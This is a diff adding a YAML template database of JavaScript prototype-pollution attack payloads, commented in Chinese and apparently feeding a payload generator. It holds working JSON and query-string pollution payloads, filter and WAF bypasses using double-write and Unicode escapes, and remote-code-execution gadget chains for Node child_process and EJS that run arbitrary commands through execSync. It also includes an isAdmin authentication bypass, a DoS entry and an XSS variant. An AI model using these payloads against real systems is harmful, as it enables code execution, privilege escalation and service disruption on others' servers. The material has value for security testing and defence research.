@@ -1,0 +1,375 @@
+ruleDB: v0.1.0
+# 原型链污染模板。
+#
+# 这一类有两个和别的类型不一样的地方：
+#
+# 1. **content_type 按载荷文本本身的语法选，不是按效果**（方案 §3）：
+#    - 是 JSON 对象 / 整段请求体 → `[json]`，运行期会真做 json.loads 语法校验
+#    - `__proto__[x]=y` 这类查询串、升级成 Node RCE 的 JS 片段 → `[raw]`
+#    别因为「这条能打成 RCE」就写 shell-command —— 那描述的是结果，不是语法。
+#
+# 2. **载荷本身只到「写进原型」那一步，价值全在下游 gadget。**
+#    所以每条 desc 都写清两件事：污染了哪个属性、谁去读它。
+#    requires 里，合并入口写 `proto-sink`，把污染变成效果的那段下游逻辑写 `proto-gadget`。
+#
+# 提交方式上，对象型载荷通常要**整段作为请求体**（`json-body`）：
+# `{"__proto__":{"polluted":"yes"}}` 用 `json` 提交方式会被当成某个字段的字符串值
+# 塞进去，变成 `"{\"__proto__\":{\"polluted\":\"yes\"}}"` —— 完全不是一个东西。
+
+templates:
+  # ---- JSON 合并污染：最常见的入口 ----
+
+  - id: proto.generic.json.proto.merge
+    name: JSON 合并污染 __proto__（通用）
+    desc: 最通用的一条，往 Object.prototype 上写任意属性。前提是这段 JSON 被送进了递归合并或深拷贝（lodash merge、$.extend(true,…)、Object.assign 式的深合并）。属性名和值都要按你要打的 gadget 改，只污染、没人读它就没有任何效果
+    vuln: [proto]
+    content_type: [json]
+    component: []
+    version: "*"
+    vars: [prop, value]
+    body: '{"__proto__":{"<<prop>>":"<<value>>"}}'
+    requires: [proto-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: proto.generic.json.constructor.merge
+    name: JSON 合并污染 constructor.prototype
+    desc: 与上一条等价，走 constructor.prototype 这条路径。目标把 __proto__ 当关键字过滤掉、或合并实现不认 __proto__ 这个键时换它。注意 constructor 在合并时会被当成普通键展开，所以能落到 Object.prototype 上
+    vuln: [proto]
+    content_type: [json]
+    component: []
+    version: "*"
+    vars: [prop, value]
+    body: '{"constructor":{"prototype":{"<<prop>>":"<<value>>"}}}'
+    requires: [proto-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: proto.generic.json.bypass.doublewrite
+    name: JSON 双写绕过 __proto__ 过滤
+    desc: 过滤是「把 __proto__ 删掉」而不是「拒绝」时用。__pro__proto__to__ 被删掉中间那一段后正好还原成 __proto__，所以过滤器和合并逻辑各看到一份不同的键。过滤器是直接拒绝的那类目标上这条没用
+    vuln: [proto]
+    content_type: [json]
+    component: []
+    version: "*"
+    vars: [prop, value]
+    body: '{"__pro__proto__to__":{"<<prop>>":"<<value>>"}}'
+    requires: [proto-sink, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 污染成 XSS ----
+
+  - id: proto.generic.json.xss.html
+    name: 污染 html 属性升级为 XSS
+    desc: 污染 Object.prototype.html。读它的是把原型上的 html 当默认模板或默认选项的下游组件（客户端模板引擎、弹窗与图表库的默认配置）。纯服务端渲染的目标上这条没有读点，要另找把污染值回显进 DOM 的属性
+    vuln: [proto]
+    content_type: [json]
+    component: []
+    version: "*"
+    vars: [js]
+    body: '{"__proto__":{"html":"<<js>>"}}'
+    requires: [proto-sink, proto-gadget]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 污染成 RCE（Node） ----
+  # 这几条都是公开的 gadget 链，能不能成取决于 Node / 模板引擎的版本，
+  # 先在实验室对着实际版本确认，别直接照着打生产。
+
+  - id: proto.generic.json.node.argv0
+    name: Node child_process 污染成 RCE
+    desc: 一次污染四个属性打 child_process。shell 和 argv0 让子进程用 node 起、NODE_OPTIONS 让它 require /proc/self/environ、env.EVIL 里是真正的 JS（结尾的 // 把同一个文件里后面的环境变量注释掉）。目标必须有 spawn 类调用、且 Node 版本仍未对这几个键做防护
+    vuln: [proto]
+    content_type: [json]
+    component: [node]
+    version: "*"
+    vars: [command]
+    body: |-
+      {"__proto__":{"shell":"node","argv0":"node","NODE_OPTIONS":"--require /proc/self/environ","env":{"EVIL":"console.log(require('child_process').execSync('<<command>>').toString())//"}}}
+    requires: [proto-sink, proto-gadget]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: proto.generic.json.node.nodeoptions
+    name: Node NODE_OPTIONS 污染（RCE 组件）
+    desc: 只污染 NODE_OPTIONS 这一半。它本身不执行任何东西，作用是被 spawn 出来的子进程读到 --require /proc/self/environ。真正要执行还得有另一个可控点提供 env.EVIL（见 node.env 那条），或者在同一个合并里把 env 一起污染。单用没效果，别指望它自己弹 shell
+    vuln: [proto]
+    content_type: [json]
+    component: [node]
+    version: "*"
+    body: '{"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ"}}'
+    requires: [proto-sink, proto-gadget]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: proto.generic.json.node.env
+    name: Node env 污染（RCE 组件）
+    desc: 只污染 env.EVIL 这一半，值是 /proc/self/environ 被 require 时执行的 JS。和 NODE_OPTIONS 那条是配套的：单独用不会执行，要两个属性都落到原型上（或在同一个对象里一起提交）才有链。目标是 Windows 时 /proc/self/environ 不存在，整条链不成立
+    vuln: [proto]
+    content_type: [json]
+    component: [node]
+    version: "*"
+    vars: [command]
+    body: |-
+      {"__proto__":{"env":{"EVIL":"require('child_process').execSync('<<command>>').toString()//"}}}
+    requires: [proto-sink, proto-gadget]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: proto.generic.json.ejs.outputfunctionname
+    name: EJS outputFunctionName 污染成 RCE
+    desc: EJS 3.1.7 之前的经典 gadget，污染 Object.prototype.outputFunctionName。渲染时它被拼进编译出来的函数体，于是注入的语句直接执行。前提是 res.render 的 options 来自一次递归合并（Express 把 app.locals、query 之类合进视图选项时最典型）。EJS 升到 3.1.7 以上这条就没了
+    vuln: [proto]
+    content_type: [json]
+    component: [ejs]
+    version: "<3.1.7"
+    vars: [command]
+    body: |-
+      {"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('<<command>>');s"}}
+    requires: [proto-sink, proto-gadget]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: proto.generic.json.ejs.escapefunction
+    name: EJS escapeFunction 污染成 RCE
+    desc: 另一条 EJS gadget，污染 client 与 escapeFunction 两个属性——渲染时 escapeFunction 被当函数源码编译，所以注入的语句会执行。outputFunctionName 被打补丁后仍能用，具体到哪个小版本失效要先对着目标的 ejs 版本确认。旧版 Express 把视图选项递归合并时才成立
+    vuln: [proto]
+    content_type: [json]
+    component: [ejs]
+    version: "*"
+    vars: [command]
+    body: |-
+      {"__proto__":{"client":true,"escapeFunction":"1; return global.process.mainModule.require('child_process').execSync('<<command>>');"}}
+    requires: [proto-sink, proto-gadget]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 污染成逻辑绕过 / DoS ----
+
+  - id: proto.generic.json.logic.isadmin
+    name: 污染 isAdmin 绕过身份判断
+    desc: 污染布尔属性绕过身份判断。读它的就是应用自己的判断语句，user.isAdmin 查不到会顺着原型链拿到 true 时即绕过。属性名按目标代码里的字段名改，常见还有 role、is_admin、verified
+    vuln: [proto]
+    content_type: [json]
+    component: []
+    version: "*"
+    vars: [prop]
+    body: '{"__proto__":{"<<prop>>":true}}'
+    requires: [proto-sink, proto-gadget]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: proto.generic.json.logic.status
+    name: 污染 status 覆盖响应状态
+    desc: 污染数字型属性。HTTP 框架把响应对象上的 status 当默认值时，污染后所有响应都变成这个码（顺带盖掉错误处理）。也用来污染超时、重试次数这类数值配置做 DoS。值必须是裸数字，带引号就变成字符串，严格比较的代码不吃
+    vuln: [proto]
+    content_type: [json]
+    component: []
+    version: "*"
+    vars: [prop, n]
+    body: '{"__proto__":{"<<prop>>":<<n>>}}'
+    requires: [proto-sink, proto-gadget]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 外层包装：把内层载荷塞进 <<payload>> 做两段式 ----
+
+  - id: proto.generic.json.wrap.field
+    name: 把内层污染载荷包进业务字段
+    desc: 外层包装。目标的合并点是某个业务字段（把整个 body 递归合并进配置的对象）时，用这条把内层载荷放到那个字段里。生成时需要把内层载荷填进嵌套载荷，单独用这条产出的是半截 JSON
+    vuln: [proto]
+    content_type: [json]
+    component: []
+    version: "*"
+    vars: [field]
+    body: '{"<<field>>":<<payload>>}'
+    requires: [proto-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 查询串形态 ----
+  # 注入点不是 JSON body，而是被 qs / query-string 这类解析器拆成对象再合并时走这几条。
+  # 解析器把 `__proto__[x]=y` 还原成嵌套对象，后面的合并逻辑照单全收。
+
+  - id: proto.generic.query.proto.bracket
+    name: 查询串污染 __proto__（方括号）
+    desc: 查询串/表单里最常见的形态。style 槽位换大小写和编码变体——过滤器只匹配明文 __proto__、或者只解码一次时用得上。合并实现只认 JSON 不认查询串时这条不成立
+    vuln: [proto]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      style:
+        options: ["__proto__", "__PROTO__", "%5f%5fproto%5f%5f", "__pro__proto__to__"]
+        default: "__proto__"
+    vars: [prop, value]
+    body: <<style>>[<<prop>>]=<<value>>
+    requires: [proto-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: proto.generic.query.proto.dot
+    name: 查询串污染 __proto__（点号）
+    desc: 同上，点号形态。部分解析器不把方括号展开成对象、但认点号路径，两边都试一遍最省事。构造器和 __proto__ 两种前缀都能配这条的点号写法
+    vuln: [proto]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      style:
+        options: ["__proto__", "__PROTO__", "%5f%5fproto%5f%5f", "__pro__proto__to__"]
+        default: "__proto__"
+    vars: [prop, value]
+    body: <<style>>.<<prop>>=<<value>>
+    requires: [proto-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: proto.generic.query.constructor.bracket
+    name: 查询串污染 constructor.prototype（方括号）
+    desc: 查询串里 __proto__ 被过滤时的替代路径。解析器展开成 {constructor:{prototype:{...}}} 后落到 Object.prototype 上。目标只拦 __proto__ 这一个字符串时用它
+    vuln: [proto]
+    content_type: [raw]
+    component: []
+    version: "*"
+    vars: [prop, value]
+    body: constructor[prototype][<<prop>>]=<<value>>
+    requires: [proto-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: proto.generic.query.constructor.dot
+    name: 查询串污染 constructor.prototype（点号）
+    desc: 与上一条同义的点号写法。用的解析器只认点号路径时换它，其余判断和上一条一样
+    vuln: [proto]
+    content_type: [raw]
+    component: []
+    version: "*"
+    vars: [prop, value]
+    body: constructor.prototype.<<prop>>=<<value>>
+    requires: [proto-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: proto.generic.query.bypass.doublewrite
+    name: 查询串双写绕过 __proto__ 过滤
+    desc: 过滤器把 __proto__ 删掉而不是拒绝时用，__pro__proto__to__ 删一次正好还原。和 JSON 那条双写是同一个思路，只是载荷落在查询串上。过滤器直接拒绝、或者解码后才过滤的目标上无效
+    vuln: [proto]
+    content_type: [raw]
+    component: []
+    version: "*"
+    vars: [prop, value]
+    body: __pro__proto__to__[<<prop>>]=<<value>>
+    requires: [proto-sink, weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 编码变形 ----
+  # 过滤器扫的是**原始 body 里的字符串**，而 JSON 解析器在合并之前会先把
+  # \uXXXX 解出来——两边看到的东西不一样，这就是下面这条的全部原理。
+
+  - id: proto.generic.json.proto.unicode
+    name: JSON 合并污染 __proto__（Unicode 转义）
+    desc: >-
+      JSON 里的 _ 就是下划线，解析器解完还是 __proto__，但 WAF 与黑名单
+      扫原文时看到的是一串 \u 转义。过滤器只匹配明文 __proto__ / constructor 时用。
+      反过来也成立：目标把 JSON 日志直接丢给正则审计时，这条会显得很干净。
+    vuln: [proto]
+    content_type: [json]
+    component: []
+    version: "*"
+    slots:
+      key:
+        options:
+          - {id: proto,       name: "__proto__ 全转义",  k: "\\u005f\\u005fproto\\u005f\\u005f"}
+          - {id: proto_part,  name: "只转义首字符",      k: "\\u005f_proto__"}
+          - {id: ctor,        name: "constructor 转义",  k: "\\u0063onstructor"}
+        default: proto
+    vars: [prop, value]
+    body: '{"<<key.k>>":{"<<prop>>":"<<value>>"}}'
+    requires: [proto-sink, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 服务端：Node 的另外两条 gadget ----
+  # 和 node.argv0 那几条的区别是：这里不碰 argv0 / NODE_OPTIONS，
+  # 只改被 spawn 时用的 shell 与喂给它的 stdin。
+
+  - id: proto.generic.json.node.shellinput
+    name: Node child_process 污染 shell + input
+    desc: >-
+      下游调的是 execFileSync / spawnSync 这类「选项对象可能来自原型」的接口时用：
+      污染 shell 把执行器换成 node，再污染 input 把 JS 从 stdin 喂进去，
+      于是 node 直接跑我们给的脚本。不需要 argv0 与 NODE_OPTIONS，
+      所以目标针对那两个键做了防护时这条仍然可能过。
+      要求 Node 版本仍未对 child_process 的选项做原型保护，且应用真的有一次 spawn 调用。
+    vuln: [proto]
+    content_type: [json]
+    component: [node]
+    version: "*"
+    vars: [command]
+    body: |-
+      {"__proto__":{"shell":"node","input":"require('child_process').execSync('<<command>>').toString()"}}
+    requires: [proto-sink, proto-gadget]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 外层包装：数组形态 ----
+  # 有些合并入口只遍历数组元素（把 body 当列表处理），wrap.field 那种对象包装
+  # 到不了它，得用这条。
+
+  - id: proto.generic.json.wrap.array
+    name: 把内层污染载荷包进数组
+    desc: >-
+      外层包装的数组版：目标的合并点是「遍历请求体里的每个元素再逐个合并」
+      （批量更新、批量配置那类接口）时用。生成时要给嵌套内层载荷，
+      单独用这条产出的是半截 JSON。
+    vuln: [proto]
+    content_type: [json]
+    component: []
+    version: "*"
+    body: '[<<payload>>]'
+    requires: [proto-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
